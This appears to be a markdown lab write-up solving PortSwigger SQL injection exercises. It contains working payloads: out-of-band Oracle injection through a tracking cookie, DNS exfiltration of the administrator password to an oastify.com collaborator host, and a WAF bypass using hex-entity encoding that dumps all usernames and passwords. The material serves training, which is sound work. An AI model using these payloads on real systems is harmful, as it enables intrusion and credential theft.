## SQL Injection Scenerios
### Blind SQL injection with out-of-band interaction
Ref: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band<br>
https://portswigger.net/web-security/sql-injection/cheat-sheet<br>
Tracking cookie is vulnerable to SQL Injection. You will have to try the payloads from the above link for different database. We have modified the payload using single quote and UNION operator, finally URL encode it (CTRL +U). Below payload is for Oracle unpatched versions.
```
Cookie: TrackingId=X'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--
```
We got the response on the collaborator server that confirms the presence of out of band SQL Injection vulnerablilty.
### Blind SQL Injection with data exfiltration
Ref: https://portswigger.net/web-security/sql-injection/cheat-sheet<br>
Tracking cookie is vulnerable to SQL Injection. You will have to try the payloads from the above link for different database. We have modified the payload using single quote and UNION operator, finally URL encode it (CTRL +U). 
```
Cookie: TrackingId=SA3Y8Dnuxa2Ag799'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.prkxyd141jllo9seb9810lhzmqshg84x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```
If you recieve DNS like this: The Collaborator server received a DNS lookup of type AAAA for the domain name h81jh6xbrh7yya8ta7jk.prkxyd141jllo9seb9810lhzmqshg84x.oastify.com then the password of administrator is h81jh6xbrh7yya8ta7jk.
### SQL injection with filter bypass via XML encoding
In the request we could see XML input is getting passed as part for POST request body. Install Hackvertor Extension from the Burp Extender. The original body is given below.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
Lets try performing UNION attack to detect the number of columns.
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1 UNION SELECT NULL</storeId>
</stockCheck>
```
Firewall detected it and blocked it.
Select the payload and right Click > Extensions > Hackvertor > Encode > hex_entities
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId><@hex_entities>1 UNION SELECT NULL
	</@hex_entities>
</storeId>undefined</stockCheck>
```
Nice no error, output is also coming means the number of columns is 1, now we need to extract the username and password using a single column.
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId><@hex_entities>1 UNION SELECT username || '-' || password from users
	</@hex_entities>
</storeId>undefined</stockCheck>
```
Nice got the username and password of all the users.
### Visible error-based SQL injection
```
Cookie: TrackingId=X'
500 Internal Server Error
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'X''. Expected  char
```
```
Cookie: TrackingId=X'--
200 OK
```
SQL confirmed, but the issue is we will not get any result in response. If the query fails then 500 error if not then 200 OK.
